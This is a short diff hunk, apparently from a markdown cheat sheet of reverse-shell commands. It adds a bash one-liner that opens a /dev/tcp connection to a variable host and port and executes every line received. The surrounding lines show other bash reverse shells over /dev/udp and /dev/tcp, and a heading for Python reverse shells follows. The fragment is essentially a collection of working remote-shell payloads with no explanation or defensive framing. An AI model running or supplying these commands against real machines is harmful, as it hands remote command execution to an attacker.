@@ -42,6 +42,10 @@ sh -i >& /dev/udp/192.168.1.2/5555 0>&1
 0<&196;exec 196<>/dev/tcp/$ip/$port; sh <&196 >&196 2>&196
 ```
 
+```bash
+exec 5<>/dev/tcp/$ip/$port && while read line 0<&5; do $line 2>&5 >&5; done
+```
+
 ### Python Reverse Shells
 
 ```python
